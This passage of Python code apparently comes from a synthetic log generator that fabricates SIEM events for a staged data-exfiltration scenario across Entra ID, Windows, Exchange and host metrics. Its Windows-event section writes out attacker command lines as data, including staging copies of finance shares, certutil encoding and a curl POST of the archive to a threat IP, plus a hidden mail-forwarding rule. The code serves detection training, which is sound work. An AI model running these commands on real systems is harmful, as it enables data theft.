            if day >= 1 and 9 <= hour <= 17 and random.random() < 0.15:
                events.append(signin_from_threat_ip(
                    self.time_utils.base_date, day, hour, random.randint(0, 59),
                    self.cfg.comp_user, self.cfg.threat_ip,
                    success=False, demo_id=demo_id
                ))

        # Initial Access (Day 4): Phishing success + CA blocks
        if phase == "initial_access":
            # Hour 9-11: Attack sequence
            if 9 <= hour <= 11:
                # Successful phishing signin at hour 10
                if hour == 10:
                    events.append(signin_from_threat_ip(
                        self.time_utils.base_date, day, hour, 15,
                        self.cfg.lateral_user, self.cfg.threat_ip,
                        success=True, demo_id=demo_id
                    ))
                # CA blocks on follow-up attempts
                if hour == 11 and random.random() < 0.5:
                    events.append(signin_blocked_by_ca(
                        self.time_utils.base_date, day, hour, random.randint(0, 30),
                        username=self.cfg.lateral_user, client_ip=self.cfg.threat_ip,
                        policy_name="Block risky sign-ins",
                        demo_id=demo_id
                    ))

        # Lateral Movement (Day 5-7): Failed MFA attempts, CA blocks
        if phase == "lateral":
            # Occasional CA blocks during business hours
            if 9 <= hour <= 17 and random.random() < 0.2:
                events.append(signin_blocked_by_ca(
                    self.time_utils.base_date, day, hour, random.randint(0, 59),
                    username=self.cfg.comp_user,
                    policy_name="Require MFA from untrusted locations",
                    demo_id=demo_id
                ))

        # Persistence (Day 8-10): Off-hours signin activity
        if phase == "persistence":
            # Off-hours signins (late night/early morning)
            if 22 <= hour or hour <= 5:
                if random.random() < 0.3:
                    events.append(signin_from_threat_ip(
                        self.time_utils.base_date, day, hour, random.randint(0, 59),
                        self.cfg.comp_user, self.cfg.threat_ip,
                        success=True, demo_id=demo_id
                    ))

        # Exfil (Day 11-13): Service principal signin during exfil window
        if phase == "exfil":
            # Exfil window: 2-5 AM
            if 2 <= hour <= 5:
                # One signin per hour during exfil
                if random.random() < 0.4:
                    events.append(signin_from_threat_ip(
                        self.time_utils.base_date, day, hour, random.randint(0, 59),
                        self.cfg.comp_user, self.cfg.threat_ip,
                        success=True, demo_id=demo_id
                    ))

        return events

    def entraid_audit_hour(self, day: int, hour: int) -> List[str]:
        """Generate EntraID audit events for exfil scenario.

        Timeline:
        - Day 8, 14:00: Add application, Add SP credentials
        - Day 9, 10:00: Add member to role
        - Day 11, 03:00: Consent to application
        - Day 12, 04:00: Revoke sessions, Confirm compromised (response)
        """
        events = []
        phase = get_phase(day)

        if phase is None:
            return events

        demo_id = self.cfg.demo_id if self.config.demo_id_enabled else None

        # Import audit functions from generator
        from generators.generate_entraid import (
            audit_add_application, audit_add_service_principal_credentials,
            audit_add_member_to_role, audit_consent_to_application,
            audit_revoke_signin_sessions, audit_confirm_user_compromised,
            audit_user_registered_security_info
        )

        # Persistence phase: Create malicious app and credentials
        if phase == "persistence":
            if day == 8 and hour == 14:
                # Create malicious application
                events.append(audit_add_application(
                    self.time_utils.base_date, day, hour, 15,
                    app_name="DataSync Service",
                    admin_key="it.admin",
                    demo_id=demo_id
                ))
                # Add credentials to service principal
                events.append(audit_add_service_principal_credentials(
                    self.time_utils.base_date, day, hour, 18,
                    app_name="DataSync Service",
                    admin_key="it.admin",
                    demo_id=demo_id
                ))
                # Attacker registers security info
                events.append(audit_user_registered_security_info(
                    self.time_utils.base_date, day, hour, 22,
                    target_user=self.cfg.lateral_user,
                    method="Authenticator App",
                    demo_id=demo_id
                ))

            if day == 9 and hour == 10:
                # Elevate service principal to Application Administrator
                events.append(audit_add_member_to_role(
                    self.time_utils.base_date, day, hour, 30,
                    target_user="svc-datasync",
                    role_name="Application Administrator",
                    admin_key="it.admin",
                    demo_id=demo_id
                ))

        # Exfil phase: Consent to app for data access
        if phase == "exfil":
            if day == 11 and hour == 3:
                # Admin consent to malicious app
                events.append(audit_consent_to_application(
                    self.time_utils.base_date, day, hour, 15,
                    app_name="DataSync Service",
                    admin_key="it.admin",
                    demo_id=demo_id
                ))

            if day == 12 and hour == 4:
                # Security team response - revoke sessions
                events.append(audit_revoke_signin_sessions(
                    self.time_utils.base_date, day, hour, 30,
                    target_user=self.cfg.comp_user,
                    admin_key="sec.admin",
                    demo_id=demo_id
                ))
                # Confirm user compromised
                events.append(audit_confirm_user_compromised(
                    self.time_utils.base_date, day, hour, 35,
                    target_user=self.cfg.comp_user,
                    admin_key="sec.admin",
                    demo_id=demo_id
                ))

        return events

    # =========================================================================
    # PERFMON ANOMALY FUNCTIONS
    # =========================================================================

    def perfmon_cpu_anomaly(self, host: str, day: int, hour: int) -> int:
        """
        Check if this host/day/hour should have CPU anomaly.
        Returns: 0 = no anomaly, 1 = moderate spike, 2 = high spike

        Anomaly hosts:
          - BOS-WS-AMILLER01: Alex Miller's workstation (Boston target)
          - ATL-WS-JBROWN01: Jessica Brown's workstation (Atlanta initial compromise)
        """
        alex_host = "BOS-WS-AMILLER01"  # Primary target - Boston Finance
        jessica_host = "ATL-WS-JBROWN01"  # Initial compromise - Atlanta IT

        # Jessica's workstation (Atlanta) - early phase activity
        if host == jessica_host:
            # Days 1-3: Post-compromise reconnaissance from Jessica's machine
            if 1 <= day <= 3:
                if 10 <= hour <= 16 and random.randint(0, 3) == 0:
                    return 1  # Moderate spike
            # Days 4-5: Lateral movement preparation
            if 4 <= day <= 5:
                if 14 <= hour <= 17:
                    return 2  # High spike during cross-site probing

        # Alex's workstation (Boston) - later phase target
        if host == alex_host:
            # Days 5-7: High CPU during lateral movement to Boston
            if 5 <= day <= 7:
                if 10 <= hour <= 16 and random.randint(0, 2) == 0:
                    return 2  # High spike
            # Days 11-13: Late night activity during exfil
            if 11 <= day <= 13:
                if 2 <= hour <= 4:
                    return 1  # Moderate spike

        return 0

    def perfmon_disk_anomaly(self, host: str, day: int, hour: int) -> int:
        """Check if this host/day/hour should have disk anomaly."""
        alex_host = "BOS-WS-AMILLER01"
        jessica_host = "ATL-WS-JBROWN01"

        # Days 8-10: FILE-01 (Boston) has unusual disk I/O during staging
        if host == "BOS-FILE-01" or host == "FILE-01":
            if 8 <= day <= 10 and 14 <= hour <= 17:
                return 1

        # Jessica's workstation - early data collection
        if host == jessica_host:
            if 2 <= day <= 4 and 10 <= hour <= 17:
                return 1

        # Days 11-13: Alex's workstation disk activity during exfil
        if host == alex_host:
            if 11 <= day <= 13 and 2 <= hour <= 4:
                return 1

        return 0

    def perfmon_network_anomaly(self, host: str, day: int, hour: int) -> int:
        """
        Check if this host/day/hour should have network anomaly.
        Returns: percentage multiplier (100 = normal)
        """
        alex_host = "BOS-WS-AMILLER01"
        jessica_host = "ATL-WS-JBROWN01"

        # Days 11-13: High network traffic at night (exfiltration from Boston)
        if host == alex_host:
            if 11 <= day <= 13 and 2 <= hour <= 4:
                return 350  # 3.5x normal

        # Jessica's workstation - cross-site traffic to Boston
        if host == jessica_host:
            if 4 <= day <= 7 and 14 <= hour <= 17:
                return 250  # 2.5x normal for cross-site lateral movement

        # FILE-01 (Boston) elevated during staging
        if host in ("BOS-FILE-01", "FILE-01"):
            if 8 <= day <= 10 and 14 <= hour <= 17:
                return 180  # 1.8x normal

        return 100

    def perfmon_adjusted_cpu(self, host: str, day: int, hour: int, base_min: int, base_max: int) -> Tuple[int, int]:
        """Get CPU values adjusted for anomalies."""
        anomaly = self.perfmon_cpu_anomaly(host, day, hour)

        if anomaly == 1:
            return (base_min + 20, base_max + 25)
        elif anomaly == 2:
            return (base_min + 35, base_max + 40)
        return (base_min, base_max)

    # =========================================================================
    # LINUX ANOMALY FUNCTIONS
    # =========================================================================

    def linux_cpu_anomaly(self, host: str, day: int, hour: int) -> int:
        """Returns spike value to add (0 = no anomaly)."""
        primary = "WEB-01"

        if host == primary:
            # Days 8-10: High CPU during staging
            if 8 <= day <= 10 and 14 <= hour <= 17:
                return random.randint(25, 45)
            # Days 11-13: Late night during exfil
            if 11 <= day <= 13 and 2 <= hour <= 4:
                return random.randint(20, 35)

        return 0

    def linux_memory_anomaly(self, host: str, day: int, hour: int) -> int:
        """Returns spike value to add (0 = no anomaly)."""
        primary = "WEB-01"

        if host == primary:
            if 8 <= day <= 10 and 14 <= hour <= 17:
                return random.randint(15, 30)

        return 0

    def linux_network_anomaly(self, host: str, day: int, hour: int) -> int:
        """Returns multiplier (100 = normal)."""
        primary = "WEB-01"

        if host == primary:
            # Exfiltration
            if 11 <= day <= 13 and 2 <= hour <= 4:
                return 400
            # Staging
            if 8 <= day <= 10 and 14 <= hour <= 17:
                return 200

        return 100

    def linux_has_anomaly(self, host: str, day: int, hour: int) -> str:
        """Check if any anomaly is present."""
        cpu = self.linux_cpu_anomaly(host, day, hour)
        mem = self.linux_memory_anomaly(host, day, hour)
        net = self.linux_network_anomaly(host, day, hour)

        if cpu > 0 or mem > 0 or net != 100:
            return self.cfg.demo_id
        return ""

    # =========================================================================
    # WINDOWS EVENT LOG
    # =========================================================================

    def winevent_has_events(self, day: int, hour: int) -> bool:
        """Check if wineventlog exfil events should be generated."""
        phase = get_phase(day)

        if phase == "recon" and 9 <= hour <= 17:  # Password spray
            return random.randint(0, 3) == 0
        if phase == "initial_access" and hour == 14:
            return True
        if phase == "lateral" and 10 <= hour <= 16:
            return random.randint(0, 5) == 0
        if phase == "persistence" and day == 8 and hour == 11:  # Priv escalation
            return True
        if phase == "persistence" and 9 <= day <= 10 and 14 <= hour <= 17:  # Staging
            return random.randint(0, 2) == 0
        if phase == "exfil" and 2 <= hour <= 4:
            return True

        return False

    def winevent_hour(self, day: int, hour: int) -> List[dict]:
        """Generate Windows Event Log events for exfil scenario.

        Returns list of event dictionaries that will be formatted by the generator.

        Timeline:
        - Days 0-3 (Recon): Password spray attempts (4625)
        - Day 4 (Initial Access): Successful logon from compromised account (4624)
        - Days 5-7 (Lateral): Reconnaissance commands (4688), Kerberos tickets (4769)
        - Day 8 (Persistence): Privilege escalation (4672, 4728)
        - Days 9-10 (Persistence): Staging activity (4688 - PowerShell, file ops)
        - Days 11-13 (Exfil): Data compression/encoding (4688 - certutil, compress)
        """
        events = []
        phase = get_phase(day)

        if phase is None:
            return events

        demo_id = self.cfg.demo_id if self.config.demo_id_enabled else None

        # Reconnaissance (Day 0-3): Password spray attempts
        if phase == "recon":
            if 9 <= hour <= 17 and random.random() < 0.25:
                # Failed logon attempts from threat IP
                for target in random.sample(self.spray_targets, random.randint(2, 4)):
                    events.append({
                        "event_id": 4625,
                        "computer": "BOS-DC-01",
                        "user": target,
                        "source_ip": self.cfg.threat_ip,
                        "reason": "Unknown user name or bad password.",
                        "minute": random.randint(0, 59),
                        "demo_id": demo_id,
                    })

        # Initial Access (Day 4): Successful logon after phishing
        if phase == "initial_access":
            if hour == 14:
                # Jessica's successful logon from her workstation
                events.append({
                    "event_id": 4624,
                    "computer": "ATL-DC-01",
                    "user": self.cfg.lateral_user,
                    "logon_type": 3,
                    "source_ip": self.cfg.jessica_ws_ip,
                    "minute": 15,
                    "demo_id": demo_id,
                })
                # Special privileges assigned
                events.append({
                    "event_id": 4672,
                    "computer": "ATL-DC-01",
                    "user": self.cfg.lateral_user,
                    "minute": 16,
                    "demo_id": demo_id,
                })

        # Lateral Movement (Day 5-7): Reconnaissance and Kerberos activity
        if phase == "lateral":
            if 10 <= hour <= 16 and random.random() < 0.3:
                # Reconnaissance commands from Jessica's workstation
                recon_cmds = [
                    ("cmd.exe", "cmd.exe /c whoami /all"),
                    ("cmd.exe", "cmd.exe /c net user /domain"),
                    ("cmd.exe", 'cmd.exe /c net group "Domain Admins" /domain'),
                    ("cmd.exe", "cmd.exe /c net view \\\\BOS-FILE-01"),
                    ("powershell.exe", "powershell.exe -c Get-ADUser -Filter *"),
                ]
                cmd = random.choice(recon_cmds)
                events.append({
                    "event_id": 4688,
                    "computer": self.cfg.jessica_ws_hostname,
                    "user": self.cfg.lateral_user,
                    "process_name": f"C:\\Windows\\System32\\{cmd[0]}",
                    "command_line": cmd[1],
                    "minute": random.randint(0, 59),
                    "demo_id": demo_id,
                })

                # Kerberos ticket requests to Boston servers
                if random.random() < 0.5:
                    services = ["cifs/BOS-FILE-01", "cifs/BOS-DC-01", "ldap/BOS-DC-01"]
                    events.append({
                        "event_id": 4769,
                        "computer": "BOS-DC-01",
                        "user": self.cfg.lateral_user,
                        "service_name": random.choice(services),
                        "source_ip": self.cfg.jessica_ws_ip,
                        "minute": random.randint(0, 59),
                        "demo_id": demo_id,
                    })

        # Persistence (Day 8): Privilege escalation
        if phase == "persistence" and day == 8:
            if hour == 11:
                # Add compromised user to privileged group
                events.append({
                    "event_id": 4728,
                    "computer": "BOS-DC-01",
                    "admin_user": self.cfg.lateral_user,
                    "user": self.cfg.comp_user,
                    "group_name": "Domain Admins",
                    "minute": 30,
                    "demo_id": demo_id,
                })
                # Alex gets special privileges
                events.append({
                    "event_id": 4672,
                    "computer": "BOS-DC-01",
                    "user": self.cfg.comp_user,
                    "minute": 31,
                    "demo_id": demo_id,
                })

        # Persistence (Day 9-10): Staging activity
        if phase == "persistence" and 9 <= day <= 10:
            if 14 <= hour <= 17 and random.random() < 0.4:
                staging_cmds = [
                    ("cmd.exe", "cmd.exe /c dir \\\\BOS-FILE-01\\finance$ /s"),
                    ("xcopy.exe", "xcopy \\\\BOS-FILE-01\\finance$\\* C:\\Users\\Public\\staging\\ /s /e /h"),
                    ("powershell.exe", "powershell.exe -c Get-ChildItem -Recurse \\\\BOS-FILE-01\\confidential"),
                    ("cmd.exe", "cmd.exe /c copy \\\\BOS-FILE-01\\hr\\*.xlsx C:\\Users\\Public\\staging\\"),
                ]
                cmd = random.choice(staging_cmds)
                events.append({
                    "event_id": 4688,
                    "computer": self.cfg.comp_ws_hostname,
                    "user": self.cfg.comp_user,
                    "process_name": f"C:\\Windows\\System32\\{cmd[0]}",
                    "command_line": cmd[1],
                    "minute": random.randint(0, 59),
                    "demo_id": demo_id,
                })

        # Exfil (Day 11-13): Data compression and encoding
        if phase == "exfil":
            if 2 <= hour <= 4:
                exfil_cmds = [
                    ("powershell.exe", "powershell.exe Compress-Archive -Path C:\\Users\\Public\\staging -DestinationPath C:\\Users\\Public\\backup.zip"),
                    ("certutil.exe", "certutil.exe -encode C:\\Users\\Public\\backup.zip C:\\Users\\Public\\backup.txt"),
                    ("powershell.exe", "powershell.exe -c [Convert]::ToBase64String([IO.File]::ReadAllBytes('backup.zip')) > backup.b64"),
                    ("curl.exe", f"curl.exe -X POST -d @backup.txt https://{self.cfg.threat_ip}/upload"),
                ]
                for cmd in exfil_cmds:
                    if random.random() < 0.6:
                        events.append({
                            "event_id": 4688,
                            "computer": self.cfg.comp_ws_hostname,
                            "user": self.cfg.comp_user,
                            "process_name": f"C:\\Windows\\System32\\{cmd[0]}",
                            "command_line": cmd[1],
                            "minute": random.randint(0, 59),
                            "demo_id": demo_id,
                        })

        return events

    # =========================================================================
    # EXCHANGE EVENTS
    # =========================================================================

    def exchange_phishing_sent(self, day: int, hour: int = 16, minute: int = 42) -> List[str]:
        """Generate phishing email sent to Jessica Brown."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))
        msg_id = f"<{self.cfg.phishing_mail_id}@{self.cfg.phishing_domain}>"
        demo = f'"demo_id":"{self.cfg.demo_id}",' if self.config.demo_id_enabled else ""

        # Phishing email to Jessica
        event = {
            "Received": ts,
            "SenderAddress": self.cfg.phishing_sender,
            "RecipientAddress": self.cfg.lateral_email,
            "Subject": self.cfg.phishing_subject,
            "Status": "Delivered",
            "ToIP": "10.10.20.50",
            "FromIP": self.cfg.threat_ip,
            "Size": 15420,
            "MessageId": msg_id,
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "Directionality": "Inbound",
            "TransportRule": "Add External Email Warning",
            "ConnectorId": "Inbound from Internet",
            "SourceContext": "External inbound",
            "ThreatType": "Phish",
            "PhishConfidenceLevel": "High",
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_phishing_spray(self, day: int, hour: int = 16) -> List[str]:
        """Generate spray phishing emails to other users (camouflage)."""
        events = []
        spray_count = random.randint(5, 8)

        for i in range(spray_count):
            ts = self.time_utils.ts_iso(day, hour, random.randint(40, 59), random.randint(0, 59))
            target = self.company.get_random_user()

            # Avoid Jessica
            while target.username == self.cfg.lateral_user:
                target = self.company.get_random_user()

            status = "FilteredAsSpam" if random.randint(0, 2) != 0 else "Delivered"

            event = {
                "Received": ts,
                "SenderAddress": self.cfg.phishing_sender,
                "RecipientAddress": target.email,
                "Subject": self.cfg.phishing_subject,
                "Status": status,
                "ToIP": "10.10.20.50",
                "FromIP": self.cfg.threat_ip,
                "Size": 15420,
                "MessageId": f"<phish-spray-{i}@{self.cfg.phishing_domain}>",
                "MessageTraceId": str(uuid.uuid4()),
                "Organization": self.cfg.exchange_org,
                "Directionality": "Inbound",
                "ConnectorId": "Inbound from Internet",
                "SourceContext": "External inbound",
                "SpamScore": "7",
                "SCL": "7",
            }
            if self.config.demo_id_enabled:
                event["demo_id"] = self.cfg.demo_id

            events.append(json.dumps(event))

        return events

    def exchange_link_click(self, day: int, hour: int = 9, minute: int = 14) -> List[str]:
        """Generate Safe Links click event (Jessica clicks phishing link)."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))

        event = {
            "Received": ts,
            "SenderAddress": self.cfg.phishing_sender,
            "RecipientAddress": self.cfg.lateral_email,
            "Subject": self.cfg.phishing_subject,
            "Status": "Delivered",
            "MessageId": f"<{self.cfg.phishing_mail_id}@{self.cfg.phishing_domain}>",
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "Directionality": "Inbound",
            "SourceContext": "Safe Links click",
            "ClickedUrl": self.cfg.phishing_url,
            "ClickTime": ts,
            "UserIpAddress": self.cfg.jessica_ws_ip,
            "UrlVerdict": "Malicious",
            "ClickAction": "Allowed",
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_mailbox_access(self, day: int, hour: int = 22) -> List[str]:
        """Generate suspicious mailbox access from threat IP."""
        ts = self.time_utils.ts_iso(day, hour, random.randint(15, 45), random.randint(0, 59))

        event = {
            "Received": ts,
            "RecipientAddress": self.cfg.lateral_email,
            "Status": "MailboxLogin",
            "FromIP": self.cfg.threat_ip,
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "SourceContext": "Mailbox audit",
            "Operation": "MailboxLogin",
            "ClientIPAddress": self.cfg.threat_ip,
            "ClientInfoString": "Client=OWA;Action=LoginAs",
            "LogonType": "Owner",
            "ExternalAccess": True,
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_forwarding_rule(self, day: int, hour: int = 22, minute: int = 45) -> List[str]:
        """Generate inbox forwarding rule creation (persistence)."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))

        event = {
            "Received": ts,
            "RecipientAddress": self.cfg.lateral_email,
            "Status": "RuleCreated",
            "FromIP": self.cfg.threat_ip,
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "SourceContext": "Mailbox audit",
            "Operation": "New-InboxRule",
            "ClientIPAddress": self.cfg.threat_ip,
            "Parameters": f"Name='Security Backup';ForwardTo='backup-{self.cfg.lateral_user}@protonmail.com';DeleteMessage=true;MarkAsRead=true",
            "LogonType": "Owner",
            "ExternalAccess": True,
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_mailbox_search(self, day: int, hour: int = 23) -> List[str]:
        """Generate mailbox search queries from attacker."""
        events = []
        search_terms = ["password", "admin", "credentials", "vpn", "azure", "aws"]

        for term in search_terms:
            ts = self.time_utils.ts_iso(day, hour, random.randint(0, 30), random.randint(0, 59))

            event = {
                "Received": ts,
                "RecipientAddress": self.cfg.lateral_email,
                "Status": "SearchQuery",
                "FromIP": self.cfg.threat_ip,
                "MessageTraceId": str(uuid.uuid4()),
                "Organization": self.cfg.exchange_org,
                "SourceContext": "Mailbox audit",
                "Operation": "SearchQueryInitiated",
                "ClientIPAddress": self.cfg.threat_ip,
                "SearchQuery": term,
                "ItemsFound": str(random.randint(5, 55)),
            }
            if self.config.demo_id_enabled:
                event["demo_id"] = self.cfg.demo_id

            events.append(json.dumps(event))

        return events

    def exchange_password_reset(self, day: int, hour: int = 10, minute: int = 15) -> List[str]:
        """Generate password reset notification to Alex."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))

        event = {
            "Received": ts,
            "SenderAddress": f"noreply@{self.cfg.tenant}",
            "RecipientAddress": self.cfg.comp_email,
            "Subject": "Your password has been reset by an administrator",
            "Status": "Delivered",
            "FromIP": "10.10.20.50",
            "Size": 8542,
            "MessageId": f"<pwreset-{uuid.uuid4()}@{self.cfg.tenant}>",
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "Directionality": "Intra-org",
            "SourceContext": "System notification",
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_credential_email(self, day: int, hour: int = 10, minute: int = 18) -> List[str]:
        """Generate credential delivery email from Jessica to Alex."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))

        event = {
            "Received": ts,
            "SenderAddress": self.cfg.lateral_email,
            "RecipientAddress": self.cfg.comp_email,
            "Subject": "RE: Password Reset - Your new temporary credentials",
            "Status": "Delivered",
            "FromIP": self.cfg.threat_ip,
            "Size": 12850,
            "MessageId": f"<cred-delivery-{uuid.uuid4()}@{self.cfg.tenant}>",
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "Directionality": "Intra-org",
            "SourceContext": "Internal relay",
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_forwarded_mail(self, day: int, hour: int, count: int = 2) -> List[str]:
        """Generate forwarded emails to external address (ongoing exfil)."""
        events = []

        internal_subjects = [
            "Q4 Financial Results", "Budget Planning 2026", "Confidential: Merger Discussion",
            "Employee Compensation Review", "AWS Credentials Update", "VPN Access Codes"
        ]

        for _ in range(count):
            ts = self.time_utils.ts_iso(day, hour, random.randint(0, 59), random.randint(0, 59))
            original_sender = self.company.get_random_user()

            event = {
                "Received": ts,
                "SenderAddress": self.cfg.lateral_email,
                "RecipientAddress": f"backup-{self.cfg.lateral_user}@protonmail.com",
                "Subject": f"FW: {random.choice(internal_subjects)}",
                "Status": "Delivered",
                "ToIP": "185.70.40.100",
                "FromIP": "10.10.20.50",
                "Size": random.randint(10000, 60000),
                "MessageId": f"<fwd-{uuid.uuid4()}@{self.cfg.tenant}>",
                "MessageTraceId": str(uuid.uuid4()),
                "Organization": self.cfg.exchange_org,
                "Directionality": "Outbound",
                "ConnectorId": "Outbound to Internet",
                "SourceContext": "Auto-forward rule",
                "OriginalSender": original_sender.email,
            }
            if self.config.demo_id_enabled:
                event["demo_id"] = self.cfg.demo_id

            events.append(json.dumps(event))

        return events

    def exchange_rule_removed(self, day: int, hour: int = 14, minute: int = 30) -> List[str]:
        """Generate incident response - forwarding rule removed."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))

        event = {
            "Received": ts,
            "RecipientAddress": self.cfg.lateral_email,
            "Status": "RuleRemoved",
            "FromIP": "10.10.10.50",
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "SourceContext": "Mailbox audit",
            "Operation": "Remove-InboxRule",
            "ClientIPAddress": "10.10.10.50",
            "Parameters": "Identity='Security Backup'",
            "InitiatedBy": f"sec.admin@{self.cfg.tenant}",
            "Reason": "Incident response - unauthorized forwarding rule",
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_security_alert(self, day: int, hour: int = 14, minute: int = 45) -> List[str]:
        """Generate security alert email to Jessica."""
        ts = self.time_utils.ts_iso(day, hour, minute, random.randint(0, 59))

        event = {
            "Received": ts,
            "SenderAddress": f"security@{self.cfg.tenant}",
            "RecipientAddress": self.cfg.lateral_email,
            "Subject": "[URGENT] Security Incident - Your account may have been compromised",
            "Status": "Delivered",
            "FromIP": "10.10.20.50",
            "Size": 18500,
            "MessageId": f"<security-alert-{uuid.uuid4()}@{self.cfg.tenant}>",
            "MessageTraceId": str(uuid.uuid4()),
            "Organization": self.cfg.exchange_org,
            "Directionality": "Intra-org",
            "SourceContext": "Security notification",
        }
        if self.config.demo_id_enabled:
            event["demo_id"] = self.cfg.demo_id

        return [json.dumps(event)]

    def exchange_day(self, day: int) -> List[str]:
        """Generate all Exchange exfil events for a specific day."""
        events = []

        if day == 0:
            # Day 0: Phishing email sent
            events.extend(self.exchange_phishing_sent(day, 16, 42))
            events.extend(self.exchange_phishing_spray(day, 16))
        elif day == 1:
            # Day 1: Jessica clicks link
            events.extend(self.exchange_link_click(day, 9, 14))
        elif day == 2:
            # Day 2: Attacker accesses mailbox, creates rule
            events.extend(self.exchange_mailbox_access(day, 22))
            events.extend(self.exchange_mailbox_search(day, 23))
            events.extend(self.exchange_forwarding_rule(day, 23, 45))
        elif day == 3:
            # Day 3: Password reset for Alex
            events.extend(self.exchange_password_reset(day, 10, 15))
            events.extend(self.exchange_credential_email(day, 10, 18))
        elif 4 <= day <= 11:
            # Days 4-11: Ongoing forwarding (during business hours)
            for hour in [9, 11, 14, 16]:
                if random.randint(0, 1) == 0:
                    events.extend(self.exchange_forwarded_mail(day, hour, 1))
        elif day == 12:
            # Day 12: Incident response begins
            events.extend(self.exchange_rule_removed(day, 14, 30))
            events.extend(self.exchange_security_alert(day, 14, 45))

        return events

    def exchange_hour(self, day: int, hour: int) -> List[str]:
        """Generate Exchange exfil events for a specific hour."""
        events = []

        # Most events are day-based, but forwarding happens hourly
        if 4 <= day <= 11 and 9 <= hour <= 17:
            if random.randint(0, 3) == 0:
                events.extend(self.exchange_forwarded_mail(day, hour, 1))

        return events

    def has_exfil_events(self, source: str, day: int, hour: int) -> bool:
        """Check if exfil scenario has events for this source/day/hour."""
        phase = get_phase(day)

        # Scenario complete after day 14
        if phase is None:
            return False

        if source == "asa":
            if phase == "recon":
                return (20 <= hour <= 23) or hour == 14
            elif phase == "initial_access":
                return hour == 14
            elif phase == "lateral":
                return 10 <= hour <= 16
            elif phase == "persistence":
                return 14 <= hour <= 17
            elif phase == "exfil":
                if day == 11:
                    return 1 <= hour <= 3
                elif day == 13:
                    return 3 <= hour <= 5
                else:
                    return 2 <= hour <= 4

        elif source == "aws":
            if phase == "persistence" and day == 5 and hour == 10:
                return True
            if phase == "exfil" and 2 <= hour <= 4:
                return True

        elif source == "gcp":
            if phase == "persistence" and day == 5 and hour == 11:
                return True
            if phase == "exfil" and (day == 11 or day == 12) and 3 <= hour <= 4:
                return True

        return False
